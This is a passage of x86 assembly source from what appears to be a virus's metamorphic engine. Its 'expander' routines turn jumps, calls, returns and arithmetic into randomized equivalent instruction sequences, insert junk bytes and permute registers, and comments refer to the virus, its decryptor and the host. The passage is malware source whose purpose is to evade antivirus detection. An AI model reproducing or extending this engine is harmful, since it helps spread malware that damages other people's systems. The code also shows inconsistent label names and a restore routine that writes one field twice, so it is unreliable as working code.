                            and     eax, 3
                            or      eax, eax
                            jnz     Single
                                                    ; Complex:
                            call    xpand_GenNOTMem     ; Make NOT Mem + ADD Mem,1
                            call    xpand_saveoperation
                            mov     eax, 1
                            jmp     xpand_GenNOTMem_Common

                Single:     mov     eax, [ebp+xpand_32bits]
                            or      eax, eax
                            jz      NEG32
                            mov     eax, 0E7h
                            jmp     xpand_GenNOTMem_Common_Direct
                    NEG32:  mov     eax, 0E5h
                            jmp     xpand_GenNOTMem_Common_Direct

xpand_GenNEGMem    endp

;; Generate a RET operation
xpand_GenRET       proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jnz     Single        ; Put it directly with a prob. of 1/4
                            call    xpand_saveoperation
                            call    xpand_gettmepvar        ; Allocate a temporary variable
                            call    xpand_GenJMPMem         ; Make a POP [TempVar]
                            call    Xp_GenJMPMem         ; Make a JMP [TempVar]
                            jmp     xpand_restoreOPandDecreaseRecurseLevel
                @@Single:   mov     eax, 0FEh            ; Code the RET directly and
                            mov     [edi], eax           ; generate some not-reachable
                            add     edi, 10h             ; garbage.
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenRET       endp

;; Generate a CALL Reg

xpand_GenCALLReg   proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    random2
                            and     eax, 3             ; Make it complex with a prob. of
                            or      eax, eax           ; 1/4
                            jnz     Single
                            call    xpand_saveoperation
                            call    xpand_gettmepvar      ; Let's make MOV [TempVar],Reg +
                            mov     eax, 40h           ; + CALL [TempVar]
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPMemReg
                            call    xpand_GenCALLMem
                            jmp     xpand_restoreOPandDecreaseRecurseLevel
                Single:     mov     eax, 0ECh          ; Code the CALL directly
                            mov     [edi], eax
                            mov     eax, [ebp+xpand_register]
                            mov     [edi+1], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenCALLReg   endp

;; Generate a CALL Mem (used for API calls, so EAX, ECX and EDX regs. are free
;; for use).

xpand_GenCALLMem   proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    randomboolean
                            or      eax, eax
                            jnz     Single      ; Make it complex with a prob. of 1/2
              Multiple:     call    randomboolean
                            or      eax, eax
                            jz      Multiple_Reg   ; Here we can use EAX,ECX or EDX
                            call    xpand_saveoperation
                            call    xpand_GenPUSHMem   ; Make PUSH [Mem]
                            call    xpand_gettmepvar
                            call    xpand_GenPOPMem    ; Make POP [TempVar]
                            call    xpand_GenCALLMem   ; Make CALL [TempVar]
                            jmp     xpand_restoreOPandDecreaseRecurseLevel
    Multiple_Reg:
                            call    xpand_saveoperation
    Multiple_Reg_Again:
                            call    random2
                            and     eax, 3
                            cmp     eax, 3
                            jz      Multiple_Reg_Again   ; Get EAX, ECX or EDX
                            mov     [ebp+xpand_register], eax
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPRegMem       ; Make MOV EAX/ECX/EDX,[Mem]
                            call    xpand_GenCALLReg        ; Make CALL EAX/ECX/EDX
                            jmp     xpand_restoreOPandDecreaseRecurseLevel

                Single:     mov     eax, 0EAh        ; Code the CALL [Mem] directly
xpand_GenCALLMem_Common:
                            mov     [edi], eax
                            call    xpand_CopyMemoryReference
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenCALLMem   endp

;; Generate a JMP Reg

xpand_GenJMPReg    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    RandomBoolean
                            or      eax, eax
                            jz      Single
                            call    random2
                            and     eax, 3        ; Make it complex with a prob. of 1/4
                            or      eax, eax
                            jz      Double_1
                Double_0:   call    xpand_saveoperation
                            call    xpand_gettmepvar         ; Allocate a temporary variable
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPMemReg        ; Make a MOV [TempVar],Reg
                            call    xpand_GenJMPMem          ; Make a JMP [TempVar]
                            call    xpand_restoreoperation   ; Generate some not-reachable
                            jmp     xpand_EndJmp             ; garbage
              Double_1:     call    xpand_GenPUSHReg         ; Make PUSH Reg + RET
                            call    xpand_GenRET
                            jmp     xpand_EndJmp

              Single:       mov     eax, 0EDh             ; Make the JMP Reg directly
                            mov     [edi], eax
                            mov     eax, [ebp+Xp_Register]
                            mov     [edi+1], eax
                            add     edi, 10h
                            jmp     xpand_EndJmp             ; Make some garbage

xpand_GenJMPReg    endp

;; Generate a JMP [Mem]

xpand_GenJMPMem    proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    Random
                            and     eax, 3
                            or      eax, eax
                            jnz     Single
                            call    xpand_saveoperation
                            call    xpand_GenPUSHMem      ; Make PUSH Mem
                            call    xpand_gettmepvar
                            call    xpand_GenPOPMem       ; Make POP Mem
                            call    xpand_GenJMPMem       ; Make JMP Mem
                            call    xpand_restoreoperation
                            jmp     xpand_EndJmp          ; Generate some garbage

                Single:     mov     eax, 0EBh        ; Code the JMP Mem directly
                            mov     [edi], eax
                            call    xpand_CopyMemoryReference
                            add     edi, 10h
                            jmp     xpand_EndJmp

xpand_GenJMPMem    endp

;; This function generates a JMP @xxx or a group of instructions that make
;; the same, like CMP Reg,Reg/JZ @xxx. 
xpand_GenJMP       proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single  ; Increase the recurse level and make the JMP
                                            ; directly if we are too deep in recursivity
                            mov     eax, [ebp+virii_addr0flast]
                            sub     eax, 10h
                            cmp     eax, esi   ; Check if we are making the last instrc.
                            jz      Single     ; If so, code it directly
                            call    random2
                            and     eax, 7     ; Make a complex JMP with a prob. of 1/8
                            or      eax, eax
                            jnz     Single
    Double_Other:
                            call    Random     ; Now select the type of complext JMP we
                            and     eax, 3     ; are going to make.
                            or      eax, eax
                            jz      Double_Other
                            cmp     eax, 1         ; Make Jcc(even) + Jcc(odd) or vicev.
                            jz      Double_JccJcc
                            cmp     eax, 2         ; Make CMP + Jcc
                            jz      Double_CMPJcc
                                                ; Let's do Jcc + Jcc (2nd version)
                            mov     edx, 73h
                            mov     ecx, 76h
    Double_JccJcc2:
                            call    random2
                            or      eax, eax            ; Make a random selection of two
                            jz      Double_JccJcc2_Next ; types of conditional jumps from
                            mov     edx, 75h            ; the set JAE, JBE, JNZ: any
     Double_JccJcc2_Next:                               ; combination of two of these
                            call    randomboolean       ; types one after another will
                            or      eax, eax            ; perform an unconditional JMP.
                            jz      Double_JccJcc2_Next02
                            mov     eax, edx            ; Exchange them randomly
                            mov     edx, ecx
                            mov     ecx, eax
    Double_JccJcc2_Next02:
                            call    xpand_saveoperation
                            push    ecx                 ; Set the first Jcc (EDX)
                            mov     [ebp+xpand_operate], edx

                            call    xpand_GenJcc_SingleJcc ; Make a direct Jcc
                            pop     ecx                 ; Set the second Jcc (ECX)
                            mov     [ebp+xpand_operate], ecx
                            call    xpand_GenJcc_SingleJcc ; Make the direct Jcc
                            call    xpand_RestoreOperation
                            jmp     InsertStopMark      ; Since there aren't branch-end
                                                        ; instructions (although when executed they
                                                        ; will never pass beyond), we must insert
                                                        ; a branch-end instruction to force the
                                                        ; disassembler to stop the branch of code.
    Double_CMPJcc:
                            call    xpand_saveoperation  ; Let's make a CMP Reg,Reg/Jcc
                            mov     eax, 38h
                            mov     [ebp+xpand_operate], eax
    Double_CMPJcc_x:
                            call    random2            ; Get a register to compare
                            and     eax, 7
                            cmp     eax, 4            ; Don't play with ESP!
                            jz      Double_CMPJcc_x
                            mov     [ebp+xpand_register], eax     ; Set source and destiny
                            mov     [ebp+xpand_virii_srcreg], eax  ; register as the same
                            xor     eax, eax                   ; Set a size of 32 bits
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPRegReg    ; Construct the comparision instrc.
                            call    xpand_GetSpecialJcc  ; Get a Jcc that is prepared for
    Double_CMPJcc_Common:                ; this type of operation
                            xor     eax, 1            ; Invert the last bit, since the
                            mov     [ebp+xpand_operate], eax  ; returned Jcc is prepared
                                                            ; to make a NOP operation.
                            call    xpand_GenJcc_SingleJcc   ; Make the Jcc as a single ins.
                            call    xpand_RestoreOperation
                            jmp     InsertStopMark    ; Set a stop mark.
    Double_JccJcc:
                            call    xpand_saveoperation ; Other type of a pair of Jccs that
                            call    random2           ; always jump: any conditional jump
                            and     eax, 0Fh         ; with even opcode has its opposite
                            add     eax, 70h         ; in the same opcode but setting last
                            mov     [ebp+xpand_operate], eax ; bit to 1. So, we select a
                            push    eax                 ; random conditional jump, we
                            call    xpand_GenJcc_SingleJcc ; insert it, and after that we
                            pop     eax                 ; insert the same Jcc but with the
                            jmp     Double_CMPJcc_Common ; bit 0 inversed. Example:
                                                        ; JZ @xxx + JNZ @xxx
                                                        ; JB @xxx + JAE @xxx
                Single:     mov     eax, 0E9h        ; The jump directly.
                            mov     [edi], eax
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+1], eax
                            add     edi, 10h
xpand_EndJmp:
                            call    random2         ; Now make garbage bytes with a prob.
                            and     eax, 3         ; of 1/4
                            or      eax, eax
                            jnz     xpand_DecreaseRecurseLevel
                            call    random2         ; Make a quantity of bytes from 1 to 8
                            and     eax, 7
                            add     eax, 1
                            mov     ecx, eax
        LoopInsert:
                            call    random2        ; Get a random byte
                            mov     al, 0FDh      ; Set FD pseudoopcode (it means "insert
                            mov     [edi], eax    ; this byte directly into the code").
                            add     edi, 10h
                            sub     ecx, 1
                            or      ecx, ecx      ; Repeat it the random number that we
                            jnz     LoopInsert    ; got before
                            jmp     xpand_DecreaseRecurseLevel

;; Let's insert an instruction that acts as a stop mark for the code branch.
;; This is necessary because if we code a jump as a CMP Reg,Reg / JZ @xxx,
;; the disassembler will continue tracing the code after the JZ (it's just
;; a conditional jump, not an unconditional one). So, we must set a "release"
;; mark that makes the disassembler to stop processing this line of code: RET,
;; JMP Reg or JMP Mem.
InsertStopMark:
                            call    random2
                            and     eax, 3
                            or      eax, eax       ; 0?
                            jz      InsertStopMark ; Then select another number
                            cmp     eax, 1
                            jz      GenerateRET    ; Make RET
                            cmp     eax, 2
                            jz      GenerateJMPMem ; Make JMP Mem
        ; Make a JMP Reg. We don't care where it goes, since it's never
        ; going to be executed.
    GenerateJMPReg:
                            call    xpand_saveoperation
                            call    random2           ; Get a random register
                            and     eax, 7           ; Set it
                            mov     [ebp+xpand_register], eax
                            xor     eax, eax         ; Mark 32 bits size
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenJMPReg     ; Generate a JMP Reg
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 
                    ; Make a JMP [Mem]
    GenerateJMPMem:
                            call    xpand_saveoperation ; Allocate a temporary variable
                            call    xpand_gettmepvar
                        ;   mov     eax, [ebp+Xp_Immediate] ; Something that I did and
                        ;   and     eax, 0FFFF00FFh         ; I don't remember why... :?
                        ;   mov     [ebp+Xp_Immediate], eax
                            call    xpand_GenJMPMem           ; Generate a JMP Mem
                            jmp     xpand_restoreOPandDecreaseRecurseLevel
    GenerateRET:
                            call    xpand_GenRET              ; Generate a RET
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenJMP       endp

;; This function generates a conditional jump directly or composed. Here we
;; use all the variants the shrinker is capable to shrink (obviously, because
;; if not this jumps would never be compressed).
xpand_GenJcc       proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 2   ; Code the composed jumps only on the first
                            jae     Single   ; levels of recursivity
                            call    random2
                            and     eax, 3   ; Make it directly with a prob. of 75%
                            or      eax, eax
                            jnz     Single
                Double:     call    random2
                            and     eax, 0Fh
                            or      eax, eax      ; Get a chance of 1/16
                            jnz     Double2       ; If the odds selected the other 15/16,
                                                ; make a normal double
                            mov     eax, 1        ; Mark the conditional jump as being
                            mov     [edi+7], eax   ; coded as NEG_Jcc + JMP. For example:
                            call    InternalSingle2 ; JZ @x  -->  JNZ @y/JMP @x/ @y:
                            jmp     xpand_DecreaseRecurseLevel

                Double2:    mov     eax, [ebp+xpand_operate]
                            cmp     eax, 73h     ; JAE?
                            jz      Double_JAE
                            cmp     eax, 75h     ; JNZ?
                            jz      Double_JNZ
                            cmp     eax, 76h     ; JBE?
                            jnz     Single
    Double_JBE:
                            mov     ebx, 72h   ; If JBE, we can select any pair from
                            mov     ecx, 74h   ; the set JB,JZ,JBE and we'll making a JBE
                            mov     edx, 76h
                            jmp     Double_GarbleAndSelect
    Double_JNZ:
                            mov     ebx, 72h   ; If JNZ, we can select a pair from the
                            mov     ecx, 75h   ; set JB,JNZ,JA
                            mov     edx, 77h
                            jmp     Double_GarbleAndSelect
    Double_JAE:
                            mov     ebx, 73h   ; If JAE, the set to select is JAE,JZ,JA
                            mov     ecx, 74h
                            mov     edx, 77h
    Double_GarbleAndSelect:
                            call    xpand_GarbleRegisters ; Get ramdomly two from that set.
                            call    xpand_saveoperation
                            push    ecx
                            mov     [ebp+xpand_operate], edx  ; Generate the first Jcc
                            call    InternalSingle
                            pop     ecx
                            mov     [ebp+xpand_operate], ecx  ; Generate the second Jcc
                            call    InternalSingle
                            jmp     xpand_restoreOPandDecreaseRecurseLevel 

                Single:     call    InternalSingle           ; Make it single
                            jmp     Xp_DecreaseRecurseLevel

xpand_GenJcc_SingleJcc:
    InternalSingle:
                            xor     eax, eax        ; For singles, we mark the Jcc as
                            mov     [edi+7], eax    ; not being NEG_Jcc/JMP
    InternalSingle2:
                            mov     eax, [ebp+xpand_operate]  ; Code the instruction
                            mov     [edi], eax
                            mov     eax, [ebp+xpand_virii_immediate]
                            mov     [edi+1], eax
                            add     edi, 10h
                            ret

xpand_GenJcc       endp

;; This function is to generate a MOVZX. We have three variants: the MOVZX
;; itself, MOV Reg,[Mem]/AND Reg,0FF or MOV Reg,0/MOV Reg8,[Mem]
xpand_GenMOVZX     proc

                            call    xpand_IncreaseRecurseLevel
                            cmp     eax, 3
                            jae     Single
                            call    randomboolean   ; Single?
                            or      eax, eax
                            jz      Single          ; Then, jump
                            call    randomboolean
                            or      eax, eax
                            jz      Double_1        ; Pair 1 or pair 2?
        Double_2:
                            xor     eax, eax        ; First construct the MOV Reg,[Mem]
                            mov     [ebp+xpand_32bits], eax
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPRegMem  ; Generate the operation
                            xor     eax, eax        ; And now make AND Reg,0FFh
                            mov     [ebp+xpand_32bits], eax
                            mov     eax, 20h
                            mov     [ebp+xpand_operate], eax
                            mov     eax, 0FFh
                            mov     [ebp+xpand_virii_immediate], eax
                            call    xpand_GenOPRegImm  ; Generate the operation
                            jmp     xpand_DecreaseRecurseLevel
        Double_1:
                            mov     eax, [ebp+Register32Bits]
                            call    Xpand_TranslateRegister
                            mov     ebx, [ebp+xpand_Register]
                            cmp     eax, ebx
                            jnz     Double_2
                            mov     eax, 40h         ; Make first a MOV Reg,0
                            mov     [ebp+xpand_operate], eax
                            xor     eax, eax
                            mov     [ebp+xpand_virii_immediate], eax
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPRegImm
                            mov     eax, 80h         ; And now make a MOV Reg8,[Mem]
                            mov     [ebp+xpand_32bits], eax
                            call    xpand_GenOPRegMem
                            jmp     xpand_DecreaseRecurseLevel
       @@Single:
                            mov     eax, 0F8h        ; Code directly the instruction.
                            mov     [edi], eax
                            call    xpand_CopyMemoryReference
                            mov     eax, [ebp+xpand_Register]
                            mov     [edi+7], eax
                            add     edi, 10h
                            jmp     xpand_DecreaseRecurseLevel

xpand_GenMOVZX     endp

;; Function to make the SET_WEIGHT code mark.

xpand_MakeSET_WEIGHT proc

                            call    xpand_saveoperation
                            mov     eax, [ebp+xpand_virii_srcreg]
                            mov     [ebp+xpand_register], eax
                            call    xpand_GenPUSHReg
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPRegImm
                            call    xpand_restoreoperation
                            mov     eax, [ebp+xpand_virii_immediate]
                            or      eax, eax
                            jz      ReadWeightIdent0
                            cmp     eax, 1
                            jz      ReadWeightIdent1
                            cmp     eax, 2
                            jz      ReadWeightIdent2
                            cmp     eax, 3
                            jz      ReadWeightIdent3
                            cmp     eax, 4
                            jz      ReadWeightIdent4
        ReadWeightIdent5:
                            mov     eax, [ebp+weights_x020_23]
                            jmp     SetWeight
        ReadWeightIdent0:
                            mov     eax, [ebp+weights_x000_3]
                            jmp     SetWeight
        ReadWeightIdent1:
                            mov     eax, [ebp+weights_x004_7]
                            jmp     SetWeight
        ReadWeightIdent2:
                            mov     eax, [ebp+weights_x008_11]
                            jmp     SetWeight
        ReadWeightIdent3:
                            mov     eax, [ebp+weight_x012_15]
                            jmp     SetWeight
        ReadWeightIdent4:
                            mov     eax, [ebp+weights_x016_19]
        SetWeight:
                            mov     [ebp+xpand_virii_immediate], eax
                            mov     eax, 40h
                            mov     [ebp+xpand_operate], eax
                            call    xpand_GenOPRegImm

                            call    xpand_GenOPMemReg

                            mov     eax, [ebp+xpand_virii_srcreg]
                            mov     [ebp+xpand_register], eax
                            call    xpand_GenPOPReg
                            ret

xpand_MakeSET_WEIGHT endp


;;; ------------------------------------------------
;;;

;; Now these are helper functions. They are used from other parts of the
;; engine, not only by the expander.
;; This function is an optimization of how we cam make in little code a
;; permutation of three registers in a way that every possible combination
;; is present, and moreover all them have the same probability of appear.
;; The theory is that there are 6 possible permutations for a set of three
;; values (in this case EBX, ECX and EDX). Then, following the code, you'll
;; see that the permutation is made by:
;;
;; 1) Randomly decide if goto 3)
;; 2) Exchange 1st and 2nd OR Exchange 1st and 3rd (always)
;; 3) Decide if we exchange 2nd and 3rd. Do it or not.

xpand_GarbleRegisters proc

                            call    random2
                            and     eax, 3
                            or      eax, eax
                            jz      xpand_GarbleRegisters
                            cmp     eax, 1
                            jz      Permutation0
                            cmp     eax, 2
                            jz      Permutation1
        Permutation2:
                            mov     eax, ebx
                            mov     ebx, edx
                            mov     edx, eax   ; XCHG EBX,EDX
                            jmp     Permutation0
        Permutation1:
                            mov     eax, ebx
                            mov     ebx, ecx
                            mov     ecx, eax   ; XCHG EBX,ECX
        Permutation0:
                            call    randomboolean
                            or      eax, eax
                            jz      Return
        Permutation0_0:
                            mov     eax, edx
                            mov     edx, ecx
                            mov     ecx, eax   ; XCHG ECX,EDX
                Return:     ret

xpand_GarbleRegisters endp

;; Get an special conditional jump. The jump obtained here is specially
;; selected to be used for CMP Reg,Reg/Jcc @x pairs. The direct result from
;; this instruction will make that the conditional jump never occurs, while
;; if we inverse the bit 0 of the Jcc returned we'll make that the Jcc
;; always jump.
;; The algorithm here is a hard optimization to select one of that types of
;; jumps. The jumps that act like a NOP are JO/JB/JNZ/JA/JS/JNP/JL/JG, while
;; the ones that always jump are JNO/JAE/JZ/JBE/JNS/JP/JGE/JLE. We are going
;; to use only the NOP ones. The opcodes in number are:
;;
;; 70,72,75,77,78,7B,7C,7F
;;
;; So these are the only values we can return. We pass them to binary (only
;; the low nibble):
;;
;; 0000,0010,0101,0111,1000,1011,1100,1111
;;
;; And we see that the values are repeated in a certain way. Let's join them
;; in groups:
;; 0000   1000         0 00 0     1 00 0
;; 0010   1011         0 01 0     1 01 1
;; 0101   1100   -->   0 10 1     1 10 0
;; 0111   1111         0 11 1     1 11 1
;;
;; The numbers are the same, excepting by the high bit and the low one.
;; Now, just notice that when the high bit is clear the lowest bit is the
;; same than the bit 2, and when the high bit is set the lowest bit is equal
;; to the bit 1. Then, what we do is to copy the bit 2 or 1 to the bit 0
;; depending if bit 3 is 0 or 1. Just what we do below.
xpand_GetSpecialJcc proc
                            push    ebx
                            call    random2
                            mov     ebx, eax  ; Copy the random in EBX
                            and     eax, 0Eh  ; Get a random number from 00 to 0E (even)
                            cmp     eax, 8    ; High bit active?
                            jae     Next      ; Then only shift EBX once
                            shr     ebx, 1
                    Next:   shr     ebx, 1
                            and     ebx, 1    ; Get the resulting last bit
                            add     eax, ebx  ; Add it to the random from 00 to 0E
                            add     eax, 70h  ; Convert it to Jcc
                            pop     ebx
                            ret
                           
xpand_GetSpecialJcc endp

;; This function will take the operation to perform (in an OP Reg/Mem,Imm
;; operation) and will calculate a pair of operation that do the same with
;; a new Imm value for each one. The MOV has the most variated results, and
;; there are others that can't be decomposed, such SUB.
;; The decomposition is done in the following way for every case. I had to
;; deduce each formula (concretely for OR and AND) from scratch, so maybe
;; there are others better, but I didn't find them. Maybe the formulas
;; below aren't correct: that's because I coded it, optimize it, and I didn't
;; remember to write down the process, so I have to re-deduce them :).
;;
;; Taking Rnd1, Rnd2 as random numbers, and Imm as the destiny value:
;; MOV:
;;      MOV Rnd1, ADD Imm-Rnd1
;;      MOV Rnd1&Imm, OR ((Rnd2 & Imm)^(Rnd1 & Imm))|(Rnd2 & Imm)
;;      MOV (Rnd2 & NOT(Rnd1))|Imm, AND (Rnd1 | Imm)  (1)
;;      MOV NOT(Rnd1)|Imm, AND Rnd1|Imm               (2)
;;      MOV Rnd1, XOR Rnd1^Imm
;;
;; ADD:
;;      ADD Rnd1, ADD Imm-Rnd1
;; OR:
;;      OR Rnd1&Imm, OR ((Rnd1&Imm)^Imm)|(Imm&Rnd2)
;; AND:
;;      AND Imm|Rnd1, AND Imm|NOT(Rnd1)
;; XOR:
;;      XOR Rnd1, XOR Imm^Rnd1
;;

xpand_MakeComposedOPImm proc

                            call    xpand_saveoperation
                            call    random2
                            mov     ebx, eax                 ; Get a random number in EBX
                            mov     edx, [ebp+xpand_virii_immediate]  ; Get the Imm in EDX
                            mov     eax, [ebp+xpand_operate]  ; Get the operation
                            or      eax, eax
                            jz      Double_OP_ADD       ; ADD?
                            cmp     eax, 8
                            jz      Double_OP_OR        ; OR?
                            cmp     eax, 20h
                            jz      Double_OP_AND       ; AND?
                            cmp     eax, 30h
                            jz      Double_OP_XOR       ; XOR?
                            cmp     eax, 40h
                            jnz     Return_Error
    Double_OP_MOV:                         ; MOV?
                            call    random2
                            and     eax, 7
                            or      eax, eax
                            jz      Double_OP_MOV_ADD   ; MOV + ADD
                            cmp     eax, 1
                            jz      Double_OP_MOV_OR    ; MOV + OR
                            cmp     eax, 2
                            jz      Double_OP_MOV_AND   ; MOV + AND
                            cmp     eax, 3
                            jz      Double_OP_MOV_XOR   ; MOV + XOR
                            cmp     eax, 4
                            jnz     Double_OP_MOV       ; MOV only
    Double_OP_MOV_MOV:
                            mov     eax, [ebp+xpand_flagregORmem]
                            or      eax, eax
                            jz      Double_OP_MOV_MOV_MakeReg
                            call    xpand_GenOPMemImm
                            jmp     Return_NoError
    Double_OP_MOV_MOV_MakeReg:
                            call    xpand_GenOPRegImm
                            jmp     Return_NoError

    Double_OP_MOV_ADD:                     ; Calculate the two Imms for
                            sub     edx, ebx            ; MOV + ADD
                            xor     ecx, ecx
                            jmp     Double_OP_MOV_OP
    Double_OP_MOV_OR:
                            and     ebx, edx            ; Calculate the two Imms for
                            call    random2              ; MOV + OR
                            and     eax, edx
                            xor     edx, ebx
                            or      edx, eax
                            mov     ecx, 8
                            jmp     Double_OP_MOV_OP
    Double_OP_MOV_AND:
                            call    randomboolean         ; Calculate the two Imms for
                            or      eax, eax              ; MOV + AND (two different
                            jz      Double_OP_MOV_AND_2   ; methods)
                            call    random2
                            not     ebx
                            and     eax, ebx
                            not     ebx
                            mov     ecx, eax
                            or      ecx, edx
                            or      edx, ebx
                            mov     ebx, ecx
                            mov     ecx, 20h
                            jmp     Double_OP_MOV_OP
    Double_OP_MOV_AND_2:
                            mov     ecx, ebx
                            not     ecx
                            or      ecx, edx
                            or      edx, ebx
                            mov     ebx, ecx
                            mov     ecx, 20h
                            jmp     Double_OP_MOV_OP
    Double_OP_MOV_XOR:                     ; Calculate the two Imms for XOR
                            xor     edx, ebx
                            mov     ecx, 30h
    Double_OP_MOV_OP:                      ; Make the two instructions:
                            push    ecx
                            push    edx
                            mov     eax, 40h            ; Generate a MOV Reg/Mem,Imm1
                            mov     [ebp+xpand_operate], eax
                            mov     [ebp+xpand_virii_immediate], ebx
                            mov     eax, [ebp+xpand_flagregORmem]
                            or      eax, eax
                            jz      Double_OP_MOV_OP_MakeReg
                            call    xpand_GenOPMemImm
                            pop     edx
                            pop     ecx                 ; Generate an OP Mem,Imm2
                            mov     [ebp+xpand_operate], ecx
                            mov     [ebp+xpand_virii_immediate], edx
                            call    xpand_GenOPMemImm
                            jmp     Return_NoError
    Double_OP_MOV_OP_MakeReg:
                            call    xpand_GenOPRegImm
                            pop     edx                 ; Generate an OP Reg,Imm2
                            pop     ecx
                            mov     [ebp+xpand_operate], ecx
                            mov     [ebp+xpand_virii_immediate], edx
                            call    xpand_GenOPRegImm
                            jmp     Return_NoError

    Double_OP_ADD:
                            sub     edx, ebx       ; Calculate the 2nd Imm for ADD
                            jmp     Double_OP_OP
    Double_OP_OR:
                            and     ebx, edx       ; Calculate the two Imms for OR+OR
                            mov     ecx, edx
                            xor     edx, ebx
                            call    random2
                            and     ecx, eax
                            or      edx, ecx
                            jmp     Double_OP_OP
    Double_OP_AND:
                            mov     ecx, ebx       ; Calculate the two Imms for AND+AND
                            or      ebx, edx
                            not     ecx
                            or      edx, ecx
                            jmp     Double_OP_OP
    Double_OP_XOR:
                            xor     edx, ebx       ; Calculate the two Imms for XOR+XOR
    Double_OP_OP:
                            push    edx          ; Make OP Mem/Reg,Imm1 + OP Mem/Reg,Imm2
                            mov     [ebp+xpand_virii_immediate], ebx
                            mov     eax, [ebp+xpand_flagregORmem]
                            or      eax, eax
                            jz      Double_OP_OP_MakeReg
                            call    xpand_GenOPMemImm    ; Make OP Mem,Imm1
                            pop     edx
                            mov     [ebp+xpand_virii_immediate], edx
                            call    xpand_GenOPMemImm    ; Make OP Mem,Imm2
                            jmp     Return_NoError
    Double_OP_OP_MakeReg:
                            call    xpand_GenOPRegImm    ; Make OP Reg,Imm1
                            pop     edx
                            mov     [ebp+xpand_virii_immediate], edx
                            call    xpand_GenOPRegImm    ; Make OP Reg,Imm2
    Return_NoError:
                            call    xpand_RestoreOperation
                            xor     eax, eax
                            ret
    Return_Error:
                            call    xpand_RestoreOperation
                            mov     eax, 1
                            ret

xpand_MakeComposedOPImm endp

;; This function increases the recursivity level and returns the result in
;; EAX (as a side level :).

xpand_IncreaseRecurseLevel proc

                            mov     eax, [ebp+xpand_RecurseLevel]
                            add     eax, 1
                            mov     [ebp+xpand_recurselevel], eax
                            ret

xpand_IncreaseRecurseLevel endp

;; This function restores the previous saved operation and decreases the
;; recursivity level previously increased.
xpand_RestoreOpAndDecreaseRecurseLevel proc
                            call    xpand_RestoreOperation
xpand_RestoreOpAndDecreaseRecurseLevel endp    ; No return! Continue directly
                                            ; to the next function

;; This is an entrypoint for decreasing only the recursivity level (with no
;; function restoration).
xpand_DecreaseRecurseLevel proc

                            mov     eax, [ebp+xpand_recurselevel]
                            sub     eax, 1
                            mov     [ebp+xpand_recurselevel], eax
                            ret

xpand_DecreaseRecurseLevel endp

;; This code copies the indexes and the addition of the current used memory
;; address to the appropiated fields of the current instruction at <EDI>.
xpand_CopyMemoryReference proc

                            mov     eax, [ebp+xpand_virii_mem1]
                            mov     [edi+1], eax
                            mov     eax, [ebp+xpand_virii_mem2]
                            mov     [edi+2], eax
                            mov     eax, [ebp+xpand_virii_addition]
                            mov     [edi+3], eax
                            ret

xpand_CopyMemoryReference endp

;; Function to save the current operation into the stack
xpand_SaveOperation proc

                            pop     ebx           ; Return address
                            mov     eax, [ebp+xpand_operate]
                            push    eax                       ; Save all the values of
                            mov     eax, [ebp+xpand_virii_mem1]  ; the current operation
                            push    eax
                            mov     eax, [ebp+xpand_virii_mem2]
                            push    eax
                            mov     eax, [ebp+xpand_virii_addition]
                            push    eax
                            mov     eax, [ebp+xpand_register]
                            push    eax
                            mov     eax, [ebp+xpand_virii_srcreg]
                            push    eax
                            mov     eax, [ebp+xpand_virii_immediate]
                            push    eax
                            mov     eax, [ebp+xpand_32bits]
                            push    eax
                            push    ebx                 ; Push again the return address
                            ret

xpand_SaveOperation endp

;; Function to restore the current operation from the stack
xpand_RestoreOperation proc

                            pop     ebx           ; Return address
                            pop     eax
                            mov     [ebp+xpand_32bits], eax
                            pop     eax                        ; Restore all the values
                            mov     [ebp+xpand_virii_immediate], eax    ; previously stored in the
                            pop     eax                        ; stack
                            mov     [ebp+xpand_virii_srcreg], eax
                            pop     eax
                            mov     [ebp+xpand_register], eax
                            pop     eax
                            mov     [ebp+xpand_virii_addition], eax
                            pop     eax
                            mov     [ebp+xpand_virii_mem2], eax
                            pop     eax
                            mov     [ebp+xpand_virii_mem2], eax
                            pop     eax
                            mov     [ebp+xpand_operate], eax
                            push    ebx
                            ret

Xp_RestoreOperation endp

;; Allocate a temporary variable. The variable is marked in the memory section
;; dedicated to that marks, to avoid its reusing. Since we have a data section
;; of 128 Kb, we have 16384 temporary variables to use (more than sufficient
;; for this virus). If what we are doing is expanding a decryptor code, then
;; we only use the first 4 Kb of the memory frame (the memory that we'll have
;; available in the host).
xpand_GetTempVar   proc

                            push    edx
                            call    random2
                            mov     edx, eax          ; Get a random number
        VariableCheck:
                            and     edx, 1FFF8h       ; Mask the value
                            mov     eax, [ebp+hooy_createDecryptor]
                            or      eax, eax          ; If we are making a decryptor, then
                            jz      Normal1           ; we only get variables from the
                            and     edx, 00FF8h       ; first 4 Kb and avoiding the first
                            cmp     edx, 20h          ; 32 bytes (used by the decryptor
                            jb      Add20             ; for making its operations) and the
